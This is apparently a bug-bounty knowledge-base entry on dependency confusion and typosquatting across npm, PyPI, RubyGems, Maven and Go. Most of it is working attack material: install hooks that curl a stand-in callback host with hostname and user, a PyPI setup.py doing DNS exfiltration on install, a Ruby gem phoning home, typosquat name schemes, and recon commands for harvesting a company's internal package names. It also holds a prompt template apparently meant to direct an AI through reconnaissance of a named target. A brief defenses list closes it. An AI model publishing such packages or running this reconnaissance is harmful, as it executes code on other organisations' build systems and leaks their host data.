---
id: "dependency-confusion"
title: "Dependency Confusion & Supply Chain Attacks"
type: "technique"
category: "infrastructure"
subcategory: "supply-chain"
tags: ["dependency-confusion", "supply-chain", "npm", "pypi", "package", "typosquatting", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["cicd-attacks", "javascript-analysis"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Dependency Confusion & Supply Chain Attacks

## Why This Pays
Dependency confusion can achieve RCE on internal build systems, developer machines, and production servers. Alex Birsan's original research earned $130k+ from Apple, Microsoft, and others. Many companies still have this vulnerability.

## Attack Types

### 1. Classic Dependency Confusion
```
# Concept: Company uses private packages (e.g., @company/utils)
# If the package manager checks public registry BEFORE private:
# Register "company-utils" on public npm/PyPI with higher version
# Build system installs YOUR package instead of theirs

# Step 1: Find internal package names
# Check: package.json, requirements.txt, pom.xml, go.mod, Gemfile
# Look in: leaked source code, GitHub repos, job postings, error messages

# Step 2: Register on public registry with high version
npm publish company-internal-lib@99.0.0

# Step 3: Add preinstall hook for callback
# package.json:
{
  "name": "company-internal-lib",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://YOUR_CALLBACK/exfil?host=$(hostname)&user=$(whoami)&dir=$(pwd)"
  }
}
```

### 2. NPM Specific
```
# Finding private package names:
# 1. Check package.json in public repos
# 2. Look for @scope/package patterns (scoped packages)
# 3. Unscoped internal names in dependencies
# 4. JS source maps may reveal import paths

# Install hook exploitation:
# package.json scripts that execute on install:
"preinstall": "node exploit.js"
"install": "node exploit.js"
"postinstall": "node exploit.js"

# Even if the package is never imported, just installing it runs these hooks

# Checking if a name is available:
npm view company-internal-package
# 404 = not on public npm = potential target

# .npmrc configuration issues:
# If .npmrc points to private registry but has fallback to public:
registry=https://npm.company.internal
# Falls back to https://registry.npmjs.org for unknown packages
```

### 3. PyPI Specific
```
# Python package naming:
# Internal: company_utils, company_ml_pipeline
# Check: requirements.txt, setup.py, pyproject.toml, Pipfile

# Create malicious package:
# setup.py:
from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class Exploit(install):
    def run(self):
        host = socket.gethostname()
        user = os.getenv("USER", "unknown")
        # DNS exfiltration (bypasses egress filtering):
        subprocess.call(["nslookup", f"{user}.{host}.YOUR_DOMAIN.com"])
        install.run(self)

setup(
    name="company-internal-package",
    version="99.0.0",
    cmdclass={"install": Exploit},
)

# Upload: twine upload dist/*
# PyPI has no namespace scoping — any name is first-come-first-served
```

### 4. Ruby Gems
```
# Check Gemfile for internal gems:
gem 'company-auth', source: 'https://gems.company.com'
# If source is not specified → pulls from rubygems.org

# Create malicious gem:
# lib/company-auth.rb:
require 'net/http'
Net::HTTP.get(URI("https://YOUR_CALLBACK/exfil?host=#{`hostname`.strip}"))

# Gemspec with postinstall hook:
spec.extensions = ['extconf.rb']
# extconf.rb runs arbitrary Ruby during gem install
```

### 5. Maven/Gradle (Java)
```
# Java packages use groupId:artifactId
# Internal: com.company:internal-utils

# If the build checks Maven Central before the internal repo:
# Register com.company:internal-utils on Maven Central
# (Maven Central requires domain ownership verification for groupId)

# Alternative: Target commonly mistyped groupIds
# Or find projects using unverified groupIds

# Gradle: repositories { mavenCentral(); maven { url 'internal' } }
# Order matters — mavenCentral() first = vulnerable
```

### 6. Go Modules
```
# go.mod may reference internal modules:
require (
    company.com/internal/utils v1.2.3
    github.com/company/private-lib v0.1.0
)

# Go resolves via GOPROXY (default: proxy.golang.org)
# If internal module is on a custom domain, Go tries proxy first
# Register the domain or exploit DNS to serve malicious module

# If GONOSUMCHECK is set for internal modules:
# The module can be replaced without checksum verification
```

### 7. Typosquatting
```
# Register packages with names similar to popular ones:
# requets → requests
# colourama → colorama
# python-dateutil → python-dateutl
# lodash → 1odash (lowercase L → digit 1)

# Target developers who mistype during install:
pip install requets    # Your malicious package
npm install lodassh    # Your malicious package

# Automated typosquat generation:
# - Character swaps: requests → reqeusts
# - Missing characters: requests → requsts
# - Extra characters: requests → requestss
# - Homoglyphs: requests → rеquests (Cyrillic 'е')
```

### 8. Namespace Confusion
```
# Many registries don't enforce namespace ownership:

# npm: @company/utils is scoped, company-utils is not
# If company uses company-utils (unscoped) internally
# Anyone can publish company-utils to npmjs.com

# PyPI: company_utils and company-utils are DIFFERENT packages
# Underscore vs hyphen — install one, import the other

# GitHub Packages: Namespace tied to org, but fallback to npmjs
# If .npmrc has both registries, confusion is possible
```

## Finding Internal Package Names

### Passive Reconnaissance
```
# 1. GitHub/GitLab public repos from the company
# Search for: package.json, requirements.txt, go.mod, pom.xml, Gemfile
# Look for internal-looking package names

# 2. JavaScript source code (production bundles)
# Webpack bundles contain import paths:
grep -oP 'require\("(@company/[^"]+)"\)' bundle.js
grep -oP 'from "(@company/[^"]+)"' bundle.js

# 3. Error messages / stack traces
# Internal package names leak in error pages and logs

# 4. Job postings
# "Experience with our internal tools: company-auth, company-metrics"

# 5. Published Docker images
# docker pull company/app:latest
# docker run -it company/app cat /app/package.json

# 6. NPM registry metadata for scoped packages:
curl https://registry.npmjs.org/@company/ 2>/dev/null
```

### Active Reconnaissance
```
# Enumerate npm scopes:
# Check if @company scope exists on npm
curl -s https://registry.npmjs.org/@company%2futils | jq .name

# Check PyPI for package existence:
curl -s https://pypi.org/pypi/company-internal/json
# 404 = name is available = potential target

# Batch check availability:
for pkg in company-utils company-auth company-core company-api; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/$pkg)
  echo "$pkg: $status"  # 404 = available
done
```

## Safe Proof of Concept
```
# For bug bounty: NEVER install malware
# Instead: Use a harmless callback to prove code execution

# DNS callback (recommended — passive, no data exfil):
"preinstall": "nslookup $(whoami).$(hostname).YOUR_BURP_COLLAB_SUBDOMAIN"

# HTTP callback (if DNS doesn't work):
"preinstall": "curl https://YOUR_CALLBACK/?h=$(hostname)"

# IMPORTANT: 
# - Only include hostname/username for proof
# - Never exfiltrate actual secrets or data
# - Report immediately upon confirmation
# - Request the company add you to their security researchers list
```

## Deep Dig Prompts
```
Given this target company [name]:
1. Search for public repos containing package manifests
2. Extract internal package names from JS bundles, Docker images, job posts
3. Check if those names are available on public registries
4. Verify build order (public vs private registry priority)
5. Create harmless proof-of-concept with DNS callback
6. Document: package name, registry, version, callback confirmation
```

## Defenses (For Report Recommendations)
- Use scoped packages (@company/utils instead of company-utils)
- Pin dependencies to exact versions with lockfiles
- Configure package manager to use private registry ONLY for internal packages
- Use npm/pip/maven proxy that blocks unregistered public packages
- Enable Artifactory/Nexus package blocking for known internal names
